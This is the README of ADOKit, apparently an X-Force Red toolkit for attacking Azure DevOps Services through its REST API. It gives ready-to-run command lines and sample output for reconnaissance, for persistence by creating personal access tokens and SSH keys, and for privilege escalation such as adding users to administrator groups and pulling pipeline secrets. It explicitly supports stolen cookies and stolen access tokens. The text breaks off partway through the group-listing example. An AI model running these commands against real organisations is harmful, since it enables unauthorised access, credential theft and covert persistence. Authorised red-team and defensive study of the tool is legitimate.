# ADOKit

## Description

Azure DevOps Services Attack Toolkit - ADOKit is a toolkit that can be used to attack Azure DevOps Services by taking advantage of the available REST API. The tool allows the user to specify an attack module, along with specifying valid credentials (API key or stolen  authentication cookie) for the respective Azure DevOps Services instance. The attack modules supported include reconnaissance, privilege escalation and persistence. ADOKit was built in a modular approach, so that new modules can be added in the future by the information security community.

Full details on the techniques used by ADOKit are in the X-Force Red [whitepaper](https://www.ibm.com/downloads/cas/5JKAPVYD).


## Release
* Version 1.1 of ADOKit can be found in Releases

## Table of Contents

- [ADOKit](#ADOKit)
- [Table of Contents](#table-of-contents)
- [Installation/Building](#installationbuilding)
  - [Libraries Used](#libraries-used)
  - [Pre-Compiled](#pre-compiled)
  - [Building Yourself](#building-yourself)
- [Command Modules](#command-modules)
- [Arguments/Options](#argumentsoptions)
- [Authentication Options](#authentication-options)
- [Module Details Table](#module-details-table)
- [Examples](#examples)
  - Recon
    - [Validate Azure DevOps Access](#validate-azure-devops-access)
    - [Whoami](#whoami)
    - [List Repos](#List-repos)
    - [Search Repos](#Search-repos)
    - [List Projects](#list-projects)
    - [Search Projects](#search-projects)
    - [Search Code](#Search-code)
    - [Search Files](#Search-files)
    - [List Users](#list-users)
    - [Search User](#search-user)
    - [List Groups](#list-groups)
    - [Search Groups](#search-groups)
    - [Get Group Members](#get-group-members)
    - [Get Project Permissions](#get-project-permissions)
  - Persistence
    - [Create PAT](#create-pat)
    - [List PATs](#list-pats)
    - [Remove PAT](#remove-pat)
    - [Create SSH Key](#create-ssh-key)
    - [List SSH Keys](#list-ssh-keys)
    - [Remove SSH Key](#remove-ssh-key)
  - Privilege Escalation
    - [Add Project Admin](#add-project-admin)
    - [Remove Project Admin](#remove-project-admin)
    - [Add Build Admin](#add-build-admin)
    - [Remove Build Admin](#remove-build-admin)
    - [Add Collection Admin](#add-collection-admin)
    - [Remove Collection Admin](#remove-collection-admin)
    - [Add Collection Build Admin](#add-collection-build-admin)
    - [Remove Collection Build Admin](#remove-collection-build-admin)
    - [Add Collection Build Service Account](#add-collection-build-service-account)
    - [Remove Collection Build Service Account](#remove-collection-build-service-account)
    - [Add Collection Service Account](#add-collection-service-account)
    - [Remove Collection Service Account](#remove-collection-service-account)
    - [Get Pipeline Variables](#get-pipeline-variables)
    - [Get Pipeline Secrets](#get-pipeline-secrets)
	- [Get Variable Groups](#get-variable-groups)
    - [Get Service Connections](#get-service-connections)
- [Detection](#detection)
- [Roadmap](#roadmap)
- [References](#references)

## Installation/Building

### Libraries Used
The below 3rd party libraries are used in this project.

| Library | URL | License |
| ------------- | ------------- | ------------- |
| Fody  | [https://github.com/Fody/Fody](https://github.com/Fody/Fody) | MIT License  |
| Newtonsoft.Json  | [https://github.com/JamesNK/Newtonsoft.Json](https://github.com/JamesNK/Newtonsoft.Json) | MIT License  |

### Pre-Compiled 

* Use the pre-compiled binary in Releases

### Building Yourself

Take the below steps to setup Visual Studio in order to compile the project yourself. This requires two .NET libraries that can be installed from the NuGet package manager.

* Load the Visual Studio project up and go to "Tools" --> "NuGet Package Manager" --> "Package Manager Settings"
* Go to "NuGet Package Manager" --> "Package Sources"
* Add a package source with the URL `https://api.nuget.org/v3/index.json`
* Install the Costura.Fody NuGet package. 
  * `Install-Package Costura.Fody -Version 3.3.3`
* Install the Newtonsoft.Json package
  * `Install-Package Newtonsoft.Json`
* You can now build the project yourself!

## Command Modules

* Recon
  * <b>check</b> - Check whether organization uses Azure DevOps and if credentials are valid
  * <b>whoami</b> - List the current user and its group memberships
  * <b>listrepo</b> - List all repositories
  * <b>searchrepo</b> - Search for given repository
  * <b>listproject</b> - List all projects
  * <b>searchproject</b> - Search for given project
  * <b>searchcode</b> - Search for code containing a search term
  * <b>searchfile</b> - Search for file based on a search term
  * <b>listuser</b> - List users
  * <b>searchuser</b> - Search for a given user
  * <b>listgroup</b> - List groups
  * <b>searchgroup</b> - Search for a given group
  * <b>getgroupmembers</b> - List all group members for a given group
  * <b>getpermissions</b> - Get the permissions for who has access to a given project
* Persistence
  * <b>createpat</b> - Create personal access token for user
  * <b>listpat</b> - List personal access tokens for user
  * <b>removepat</b> - Remove personal access token for user
  * <b>createsshkey</b> - Create public SSH key for user
  * <b>listsshkey</b> - List public SSH keys for user
  * <b>removesshkey</b> - Remove public SSH key for user
* Privilege Escalation
  * <b>addprojectadmin</b> - Add a user to the "Project Administrators" for a given project
  * <b>removeprojectadmin</b> - Remove a user from the "Project Administrators" group for a given project
  * <b>addbuildadmin</b> - Add a user to the "Build Administrators" group for a given project
  * <b>removebuildadmin</b> - Remove a user from the "Build Administrators" group for a given project
  * <b>addcollectionadmin</b> - Add a user to the "Project Collection Administrators" group
  * <b>removecollectionadmin</b> - Remove a user from the "Project Collection Administrators" group
  * <b>addcollectionbuildadmin</b> - Add a user to the "Project Collection Build Administrators" group
  * <b>removecollectionbuildadmin</b> - Remove a user from the "Project Collection Build Administrators" group
  * <b>addcollectionbuildsvc</b> - Add a user to the "Project Collection Build Service Accounts" group
  * <b>removecollectionbuildsvc</b> - Remove a user from the "Project Collection Build Service Accounts" group
  * <b>addcollectionsvc</b> - Add a user to the "Project Collection Service Accounts" group
  * <b>removecollectionsvc</b> - Remove a user from the "Project Collection Service Accounts" group
  * <b>getpipelinevars</b> - Retrieve any pipeline variables used for a given project.
  * <b>getpipelinesecrets</b> - Retrieve the names of any pipeline secrets used for a given project.
  * <b>getvariablegroups</b> - Retrieve any variable groups and the corresponding variables used for a given project.
  * <b>getserviceconnections</b> - Retrieve the service connections used for a given project.


## Arguments/Options

* <b>/credential:</b> - credential for authentication (PAT or Cookie). Applicable to all modules.
* <b>/url:</b> - Azure DevOps URL. Applicable to all modules.
* <b>/search:</b> - Keyword to search for. Not applicable to all modules.
* <b>/project:</b> - Project to perform an action for. Not applicable to all modules.
* <b>/user:</b> - Perform an action against a specific user. Not applicable to all modules.
* <b>/id:</b> - Used with persistence modules to perform an action against a specific token ID. Not applicable to all modules.
* <b>/group:</b> - Perform an action against a specific group. Not applicable to all modules.

## Authentication Options

Below are the authentication options you have with ADOKit when authenticating to an Azure DevOps instance.

* **Stolen Cookie** - This will be the `UserAuthentication` cookie on a user's machine for the `.dev.azure.com` domain.
  * `/credential:UserAuthentication=ABC123`
* **Personal Access Token (PAT)** - This will be an access token/API key that will be a single string.
  * `/credential:apiToken`
* **Stolen Access Token** - If you can steal or refresh a suitable access token you can also use it.
  * `/credential:accessToken`

Note: When using an access token, it must be valid for the resource Azure RM (i.e. "aud":"https://management.core.windows.net/").

## Module Details Table
The below table shows the permissions required for each module.

Attack Scenario | Module  | Special Permissions? | Notes
--- |--- | --- | ---
Recon | `check` |  No | 
Recon | `whoami` |  No | 
Recon | `listrepo` |  No | 
Recon | `searchrepo` |  No | 
Recon | `listproject` |  No | 
Recon | `searchproject` |  No | 
Recon | `searchcode` |  No | 
Recon | `searchfile` |  No | 
Recon | `listuser` |  No | 
Recon | `searchuser` |  No |
Recon | `listgroup` |  No | 
Recon | `searchgroup` |  No |
Recon | `getgroupmembers` |  No |
Recon | `getpermissions` |  No |
Persistence | `createpat` |  No | 
Persistence | `listpat` |  No | 
Persistence | `removepat` |  No | 
Persistence | `createsshkey` |  No | 
Persistence | `listsshkey` |  No | 
Persistence | `removesshkey` |  No | 
Privilege Escalation | `addprojectadmin` |  Yes - `Project Administrator`, `Project Collection Administrator` or `Project Collection Service Accounts` | 
Privilege Escalation | `removeprojectadmin` |  Yes - `Project Administrator`, `Project Collection Administrator` or `Project Collection Service Accounts`  | 
Privilege Escalation | `addbuildadmin` |  Yes - `Project Administrator`, `Project Collection Administrator` or `Project Collection Service Accounts`   | 
Privilege Escalation | `removebuildadmin` |  Yes - `Project Administrator`, `Project Collection Administrator` or `Project Collection Service Accounts`   | 
Privilege Escalation | `addcollectionadmin` |  Yes - `Project Collection Administrator` or `Project Collection Service Accounts`   | 
Privilege Escalation | `removecollectionadmin` |  Yes - `Project Collection Administrator` or `Project Collection Service Accounts`   | 
Privilege Escalation | `addcollectionbuildadmin` |  Yes - `Project Collection Administrator` or `Project Collection Service Accounts`  | 
Privilege Escalation | `removecollectionbuildadmin` |  Yes - `Project Collection Administrator` or `Project Collection Service Accounts`   | 
Privilege Escalation | `addcollectionbuildsvc` |  Yes - `Project Collection Administrator`, `Project Colection Build Administrators` or `Project Collection Service Accounts`  | 
Privilege Escalation | `removecollectionbuildsvc` |  Yes - `Project Collection Administrator`, `Project Colection Build Administrators` or `Project Collection Service Accounts`   | 
Privilege Escalation | `addcollectionsvc` |  Yes - `Project Collection Administrator` or `Project Collection Service Accounts`   | 
Privilege Escalation | `removecollectionsvc` |  Yes - `Project Collection Administrator` or `Project Collection Service Accounts` | 
Privilege Escalation | `getpipelinevars` | Yes - `Contributors` or `Readers` or `Build Administrators` or `Project Administrators` or `Project Team Member` or `Project Collection Test Service Accounts` or `Project Collection Build Service Accounts` or `Project Collection Build Administrators` or `Project Collection Service Accounts` or `Project Collection Administrators` |
Privilege Escalation | `getpipelinesecrets` |  Yes - `Contributors` or `Readers` or `Build Administrators` or `Project Administrators` or `Project Team Member` or `Project Collection Test Service Accounts` or `Project Collection Build Service Accounts` or `Project Collection Build Administrators` or `Project Collection Service Accounts` or `Project Collection Administrators` | 
Privilege Escalation | `getvariablegroups` |  Yes - `Contributors` or `Readers` or `Build Administrators` or `Project Administrators` or `Project Team Member` or `Project Collection Test Service Accounts` or `Project Collection Build Service Accounts` or `Project Collection Build Administrators` or `Project Collection Service Accounts` or `Project Collection Administrators` |
Privilege Escalation | `getserviceconnections` |  Yes - `Project Administrator`, `Project Collection Administrator` or `Project Collection Service Accounts` | 


## Examples

### Validate Azure DevOps Access

#### Use Case

> *Perform authentication check to ensure that organization is using Azure DevOps and that provided credentials are valid.*

#### Syntax

Provide the `check` module, along with any relevant authentication information and URL. This will output whether the organization provided is using Azure DevOps, and if so, will attempt to validate the credentials provided.

`ADOKit.exe check /credential:apiKey /url:https://dev.azure.com/organizationName`

`ADOKit.exe check /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName`

#### Example Output

```
C:\>ADOKit.exe check /credential:apiKey /url:https://dev.azure.com/YourOrganization

==================================================
Module:         check
Auth Type:      API Key
Search Term:
Target URL:     https://dev.azure.com/YourOrganization

Timestamp:      3/28/2023 3:33:01 PM
==================================================


[*] INFO: Checking if organization provided uses Azure DevOps

[+] SUCCESS: Organization provided exists in Azure DevOps


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.

3/28/23 19:33:02 Finished execution of check
```

### Whoami

#### Use Case

> *Get the current user and the user's group memberhips*

#### Syntax

Provide the `whoami` module, along with any relevant authentication information and URL. This will output the current user and all of its group memberhips.

`ADOKit.exe whoami /credential:apiKey /url:https://dev.azure.com/organizationName`

`ADOKit.exe whoami /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName`

#### Example Output

```
C:\>ADOKit.exe whoami /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/YourOrganization

==================================================
Module:         whoami
Auth Type:      Cookie
Search Term:
Target URL:     https://dev.azure.com/YourOrganization

Timestamp:      4/4/2023 11:33:12 AM
==================================================


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.

                                          Username |                                       Display Name |                                                UPN
------------------------------------------------------------------------------------------------------------------------------------------------------------
                                          jsmith |                                        John Smith |          jsmith@YourOrganization.onmicrosoft.com


[*] INFO: Listing group memberships for the current user


                                                             Group UPN |                                       Display Name |                                        Description
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    [YourOrganization]\Project Collection Test Service Accounts |           Project Collection Test Service Accounts | Members of this group should include the service accounts used by the test controllers set up for this project collection.
                                           [TestProject2]\Contributors |                                       Contributors | Members of this group can add, modify, and delete items within the team project.
                                           [MaraudersMap]\Contributors |                                       Contributors | Members of this group can add, modify, and delete items within the team project.
           [YourOrganization]\Project Collection Administrators |                  Project Collection Administrators | Members of this application group can perform all privileged operations on the Team Project Collection.

4/4/23 15:33:19 Finished execution of whoami

```

### List Repos

#### Use Case

> *Discover repositories being used in Azure DevOps instance*

#### Syntax

Provide the `listrepo` module, along with any relevant authentication information and URL. This will output the repository name and URL.

`ADOKit.exe listrepo /credential:apiKey /url:https://dev.azure.com/organizationName`

`ADOKit.exe listrepo /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName`

#### Example Output

```
C:\>ADOKit.exe listrepo /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization

==================================================
Module:         listrepo
Auth Type:      Cookie
Search Term:
Target URL:     https://dev.azure.com/YourOrganization

Timestamp:      3/29/2023 8:41:50 AM
==================================================


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.

                          Name |                                                URL
-----------------------------------------------------------------------------------
                  TestProject2 | https://dev.azure.com/YourOrganization/TestProject2/_git/TestProject2
                  MaraudersMap | https://dev.azure.com/YourOrganization/MaraudersMap/_git/MaraudersMap
                 SomeOtherRepo | https://dev.azure.com/YourOrganization/ProjectWithMultipleRepos/_git/SomeOtherRepo
                   AnotherRepo | https://dev.azure.com/YourOrganization/ProjectWithMultipleRepos/_git/AnotherRepo
      ProjectWithMultipleRepos | https://dev.azure.com/YourOrganization/ProjectWithMultipleRepos/_git/ProjectWithMultipleRepos
                   TestProject | https://dev.azure.com/YourOrganization/TestProject/_git/TestProject

3/29/23 12:41:53 Finished execution of listrepo

```

### Search Repos

#### Use Case

> *Search for repositories by repository name in Azure DevOps instance*

#### Syntax

Provide the `searchrepo` module and your search criteria in the `/search:` command-line argument, along with any relevant authentication information and URL. This will output the matching repository name and URL.

`ADOKit.exe searchrepo /credential:apiKey /url:https://dev.azure.com/organizationName /search:cred`

`ADOKit.exe searchrepo /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName /search:cred`

#### Example Output

```
C:\>ADOKit.exe searchrepo /credential:apiKey /url:https://dev.azure.com/YourOrganization /search:"test"

==================================================
Module:         searchrepo
Auth Type:      API Key
Search Term:    test
Target URL:     https://dev.azure.com/YourOrganization

Timestamp:      3/29/2023 9:26:57 AM
==================================================


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.

                          Name |                                                URL
-----------------------------------------------------------------------------------
                  TestProject2 | https://dev.azure.com/YourOrganization/TestProject2/_git/TestProject2
                   TestProject | https://dev.azure.com/YourOrganization/TestProject/_git/TestProject

3/29/23 13:26:59 Finished execution of searchrepo

```

### List Projects

#### Use Case

> *Discover projects being used in Azure DevOps instance*

#### Syntax

Provide the `listproject` module, along with any relevant authentication information and URL. This will output the project name, visibility (public or private) and URL.

`ADOKit.exe listproject /credential:apiKey /url:https://dev.azure.com/organizationName`

`ADOKit.exe listproject /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName`

#### Example Output

```
C:\>ADOKit.exe listproject /credential:apiKey /url:https://dev.azure.com/YourOrganization

==================================================
Module:         listproject
Auth Type:      API Key
Search Term:
Target URL:     https://dev.azure.com/YourOrganization

Timestamp:      4/4/2023 7:44:59 AM
==================================================


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.

                          Name |      Visibility |                                                URL
-----------------------------------------------------------------------------------------------------
                  TestProject2 |         private | https://dev.azure.com/YourOrganization/TestProject2
                  MaraudersMap |         private | https://dev.azure.com/YourOrganization/MaraudersMap
      ProjectWithMultipleRepos |         private | https://dev.azure.com/YourOrganization/ProjectWithMultipleRepos
                   TestProject |         private | https://dev.azure.com/YourOrganization/TestProject

4/4/23 11:45:04 Finished execution of listproject

```

### Search Projects

#### Use Case

> *Search for projects by project name in Azure DevOps instance*

#### Syntax

Provide the `searchproject` module and your search criteria in the `/search:` command-line argument, along with any relevant authentication information and URL. This will output the matching project name, visibility (public or private) and URL.

`ADOKit.exe searchproject /credential:apiKey /url:https://dev.azure.com/organizationName /search:cred`

`ADOKit.exe searchproject /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName /search:cred`

#### Example Output

```
C:\>ADOKit.exe searchproject /credential:apiKey /url:https://dev.azure.com/YourOrganization /search:"map"

==================================================
Module:         searchproject
Auth Type:      API Key
Search Term:    map
Target URL:     https://dev.azure.com/YourOrganization

Timestamp:      4/4/2023 7:45:30 AM
==================================================


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.

                          Name |      Visibility |                                                URL
-----------------------------------------------------------------------------------------------------
                  MaraudersMap |         private | https://dev.azure.com/YourOrganization/MaraudersMap

4/4/23 11:45:31 Finished execution of searchproject

```

### Search Code

#### Use Case

> *Search for code containing a given keyword in Azure DevOps instance*

#### Syntax

Provide the `searchcode` module and your search criteria in the `/search:` command-line argument, along with any relevant authentication information and URL. This will output the URL to the matching code file, along with the line in the code that matched.

`ADOKit.exe searchcode /credential:apiKey /url:https://dev.azure.com/organizationName /search:password`

`ADOKit.exe searchcode /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName /search:password`

#### Example Output

```
C:\>ADOKit.exe searchcode /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization /search:"password"

==================================================
Module:         searchcode
Auth Type:      Cookie
Search Term:    password
Target URL:     https://dev.azure.com/YourOrganization

Timestamp:      3/29/2023 3:22:21 PM
==================================================


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.


[>] URL: https://dev.azure.com/YourOrganization/MaraudersMap/_git/MaraudersMap?path=/Test.cs
    |_ Console.WriteLine("PassWord");
    |_ this is some text that has a password in it

[>] URL: https://dev.azure.com/YourOrganization/TestProject2/_git/TestProject2?path=/Program.cs
    |_ Console.WriteLine("PaSsWoRd");

[*] Match count : 3

3/29/23 19:22:22 Finished execution of searchcode
```



### Search Files

#### Use Case

> *Search for files in repositories containing a given keyword in the file name in Azure DevOps*

#### Syntax

Provide the `searchfile` module and your search criteria in the `/search:` command-line argument, along with any relevant authentication information and URL. This will output the URL to the matching file in its respective repository.

`ADOKit.exe searchfile /credential:apiKey /url:https://dev.azure.com/organizationName /search:azure-pipeline`

`ADOKit.exe searchfile /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName /search:azure-pipeline`

#### Example Output

```
C:\>ADOKit.exe searchfile /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization /search:"test"

==================================================
Module:         searchfile
Auth Type:      Cookie
Search Term:    test
Target URL:     https://dev.azure.com/YourOrganization

Timestamp:      3/29/2023 11:28:34 AM
==================================================


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.

                                                                                            File URL
----------------------------------------------------------------------------------------------------
https://dev.azure.com/YourOrganization/MaraudersMap/_git/4f159a8e-5425-4cb5-8d98-31e8ac86c4fa?path=/Test.cs
https://dev.azure.com/YourOrganization/ProjectWithMultipleRepos/_git/c1ba578c-1ce1-46ab-8827-f245f54934e9?path=/Test.cs
https://dev.azure.com/YourOrganization/TestProject/_git/fbcf0d6d-3973-4565-b641-3b1b897cfa86?path=/test.cs

3/29/23 15:28:37 Finished execution of searchfile

```


### Create PAT

#### Use Case

> *Create a personal access token (PAT) for a user that can be used for persistence to an Azure DevOps instance.*

#### Syntax

Provide the `createpat` module, along with any relevant authentication information and URL. This will output the PAT ID, name, scope, date valid til, and token content for the PAT created. The name of the PAT created will be `ADOKit-` followed by a random string of 8 characters. The date the PAT is valid until will be 1 year from the date of creation, as that is the maximum that Azure DevOps allows.

`ADOKit.exe createpat /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName`

#### Example Output

```
C:\>ADOKit.exe createpat /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization

==================================================
Module:         createpat
Auth Type:      Cookie
Search Term:
Target URL:     https://dev.azure.com/YourOrganization

Timestamp:      3/31/2023 2:33:09 PM
==================================================


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.

                                  PAT ID |                           Name |                          Scope |                    Valid Until |                                        Token Value
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    8776252f-9e03-48ea-a85c-f880cc830898 |                       ADOKit-rJxzpZwZ |                      app_token |          3/31/2024 12:00:00 AM | tokenValueWouldBeHere

3/31/23 18:33:10 Finished execution of createpat

```

### List PATs

#### Use Case

> *List all personal access tokens (PAT's) for a given user in an Azure DevOps instance.*

#### Syntax

Provide the `listpat` module, along with any relevant authentication information and URL. This will output the PAT ID, name, scope, and date valid til for all active PAT's for the user.

`ADOKit.exe listpat /credential:apiKey /url:https://dev.azure.com/organizationName`

`ADOKit.exe listpat /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName`

#### Example Output

```
C:\>ADOKit.exe listpat /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization

==================================================
Module:         listpat
Auth Type:      Cookie
Search Term:
Target URL:     https://dev.azure.com/YourOrganization

Timestamp:      3/31/2023 2:33:17 PM
==================================================


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.

                                  PAT ID |                           Name |                          Scope |                    Valid Until
-------------------------------------------------------------------------------------------------------------------------------------------
    9b354668-4424-4505-a35f-d0989034da18 |                     test-token |                      app_token |           4/29/2023 1:20:45 PM
    8776252f-9e03-48ea-a85c-f880cc830898 |                       ADOKit-rJxzpZwZ |                      app_token |          3/31/2024 12:00:00 AM

3/31/23 18:33:18 Finished execution of listpat

```

### Remove PAT

#### Use Case

> *Remove a PAT for a given user in an Azure DevOps instance.*

#### Syntax

Provide the `removepat` module, along with any relevant authentication information and URL. Additionally, provide the ID for the PAT in the `/id:` argument. This will output whether the PAT was removed or not, and then will list the current active PAT's for the user after performing the removal.

`ADOKit.exe removepat /credential:apiKey /url:https://dev.azure.com/organizationName /id:000-000-0000...`

`ADOKit.exe removepat /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName /id:000-000-0000...`

#### Example Output

```
C:\>ADOKit.exe removepat /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization /id:0b20ac58-fc65-4b66-91fe-4ff909df7298

==================================================
Module:         removepat
Auth Type:      Cookie
Search Term:
Target URL:     https://dev.azure.com/YourOrganization

Timestamp:      4/3/2023 11:04:59 AM
==================================================


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.


[+] SUCCESS: PAT with ID 0b20ac58-fc65-4b66-91fe-4ff909df7298 was removed successfully.

                                  PAT ID |                           Name |                          Scope |                    Valid Until
-------------------------------------------------------------------------------------------------------------------------------------------
    9b354668-4424-4505-a35f-d0989034da18 |                     test-token |                      app_token |           4/29/2023 1:20:45 PM

4/3/23 15:05:00 Finished execution of removepat

```

### Create SSH Key

#### Use Case

> *Create an SSH key for a user that can be used for persistence to an Azure DevOps instance.*

#### Syntax

Provide the `createsshkey` module, along with any relevant authentication information and URL. Additionally, provide your public SSH key in the `/sshkey:` argument. This will output the SSH key ID, name, scope, date valid til, and last 20 characters of the public SSH key for the SSH key created. The name of the SSH key created will be `ADOKit-` followed by a random string of 8 characters. The date the SSH key is valid until will be 1 year from the date of creation, as that is the maximum that Azure DevOps allows.

`ADOKit.exe createsshkey /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName /sshkey:"ssh-rsa ABC123"`

#### Example Output

```
C:\>ADOKit.exe createsshkey /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization /sshkey:"ssh-rsa ABC123"

==================================================
Module:         createsshkey
Auth Type:      Cookie
Search Term:
Target URL:     https://dev.azure.com/YourOrganization

Timestamp:      4/3/2023 2:51:22 PM
==================================================


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.

                              SSH Key ID |                           Name |                          Scope |                    Valid Until |            Public SSH Key
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
    fbde9f3e-bbe3-4442-befb-c2ddeab75c58 |                       ADOKit-iCBfYfFR |                      app_token |           4/3/2024 12:00:00 AM |   ...hOLNYMk5LkbLRMG36RE=

4/3/23 18:51:24 Finished execution of createsshkey

```

### List SSH Keys

#### Use Case

> *List all public SSH keys for a given user in an Azure DevOps instance.*

#### Syntax

Provide the `listsshkey` module, along with any relevant authentication information and URL. This will output the SSH Key ID, name, scope, and date valid til for all active SSH key's for the user. Additionally, it will print the last 20 characters of the public SSH key.

`ADOKit.exe listsshkey /credential:apiKey /url:https://dev.azure.com/organizationName`

`ADOKit.exe listsshkey /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName`

#### Example Output

```
C:\>ADOKit.exe listsshkey /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization

==================================================
Module:         listsshkey
Auth Type:      Cookie
Search Term:
Target URL:     https://dev.azure.com/YourOrganization

Timestamp:      4/3/2023 11:37:10 AM
==================================================


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.

                              SSH Key ID |                           Name |                          Scope |                    Valid Until |            Public SSH Key
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
    ec056907-9370-4aab-b78c-d642d551eb98 |                   test-ssh-key |                      app_token |            4/3/2024 3:13:58 PM |   ...nDoYAPisc/pEFArVVV0=

4/3/23 15:37:11 Finished execution of listsshkey

```

### Remove SSH Key

#### Use Case

> *Remove an SSH key for a given user in an Azure DevOps instance.*

#### Syntax

Provide the `removesshkey` module, along with any relevant authentication information and URL. Additionally, provide the ID for the SSH key in the `/id:` argument. This will output whether SSH key was removed or not, and then will list the current active SSH key's for the user after performing the removal.

`ADOKit.exe removesshkey /credential:apiKey /url:https://dev.azure.com/organizationName /id:000-000-0000...`

`ADOKit.exe removesshkey /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName /id:000-000-0000...`

#### Example Output

```
C:\>ADOKit.exe removesshkey /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization /id:a199c036-d7ed-4848-aae8-2397470aff97

==================================================
Module:         removesshkey
Auth Type:      Cookie
Search Term:
Target URL:     https://dev.azure.com/YourOrganization

Timestamp:      4/3/2023 1:50:08 PM
==================================================


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.


[+] SUCCESS: SSH key with ID a199c036-d7ed-4848-aae8-2397470aff97 was removed successfully.

                              SSH Key ID |                           Name |                          Scope |                    Valid Until |            Public SSH Key
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
    ec056907-9370-4aab-b78c-d642d551eb98 |                   test-ssh-key |                      app_token |            4/3/2024 3:13:58 PM |   ...nDoYAPisc/pEFArVVV0=

4/3/23 17:50:09 Finished execution of removesshkey

```

### List Users

#### Use Case

> *List users within an Azure DevOps instance*

#### Syntax

Provide the `listuser` module, along with any relevant authentication information and URL. This will output the username, display name and user principal name.

`ADOKit.exe listuser /credential:apiKey /url:https://dev.azure.com/organizationName`

`ADOKit.exe listuser /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName`

#### Example Output

```
C:\>ADOKit.exe listuser /credential:apiKey /url:https://dev.azure.com/YourOrganization

==================================================
Module:         listuser
Auth Type:      API Key
Search Term:
Target URL:     https://dev.azure.com/YourOrganization

Timestamp:      4/3/2023 4:12:07 PM
==================================================


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.

                                          Username |                                       Display Name |                                                UPN
------------------------------------------------------------------------------------------------------------------------------------------------------------
                                             user1 |                                             User 1 |             user1@YourOrganization.onmicrosoft.com
                                          jsmith |                                        John Smith |          jsmith@YourOrganization.onmicrosoft.com
                                           rsmith |                                       Ron Smith |           rsmith@YourOrganization.onmicrosoft.com
                                             user2 |                                             User 2 |             user2@YourOrganization.onmicrosoft.com

4/3/23 20:12:08 Finished execution of listuser

```

### Search User

#### Use Case

> *Search for given user(s) in Azure DevOps instance*

#### Syntax

Provide the `searchuser` module and your search criteria in the `/search:` command-line argument, along with any relevant authentication information and URL. This will output the matching username, display name and user principal name.

`ADOKit.exe searchuser /credential:apiKey /url:https://dev.azure.com/organizationName /search:user`

`ADOKit.exe searchuser /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName /search:user`

#### Example Output

```
C:\>ADOKit.exe searchuser /credential:apiKey /url:https://dev.azure.com/YourOrganization /search:"user"

==================================================
Module:         searchuser
Auth Type:      API Key
Search Term:
Target URL:     https://dev.azure.com/YourOrganization

Timestamp:      4/3/2023 4:12:23 PM
==================================================


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.

                                          Username |                                       Display Name |                                                UPN
------------------------------------------------------------------------------------------------------------------------------------------------------------
                                             user1 |                                             User 1 |             user1@YourOrganization.onmicrosoft.com
                                             user2 |                                             User 2 |             user2@YourOrganization.onmicrosoft.com

4/3/23 20:12:24 Finished execution of searchuser

```

### List Groups

#### Use Case

> *List groups within an Azure DevOps instance*

#### Syntax

Provide the `listgroup` module, along with any relevant authentication information and URL. This will output the user principal name, display name and description of group.

`ADOKit.exe listgroup /credential:apiKey /url:https://dev.azure.com/organizationName`

`ADOKit.exe listgroup /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName`

#### Example Output

```
C:\>ADOKit.exe listgroup /credential:apiKey /url:https://dev.azure.com/YourOrganization

==================================================
Module:         listgroup
Auth Type:      API Key
Search Term:
Target URL:     https://dev.azure.com/YourOrganization

Timestamp:      4/3/2023 4:48:45 PM
==================================================


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.

                                               UPN |                                       Display Name |                                        Description
------------------------------------------------------------------------------------------------------------------------------------------------------------
                        [TestProject]\Contributors |                                       Contributors | Members of this group can add, modify, and delete items within the team project.
               [TestProject2]\Build Administrators |                               Build Administrators | Members of this group can create, modify and delete build definitions and manage queued and completed builds.
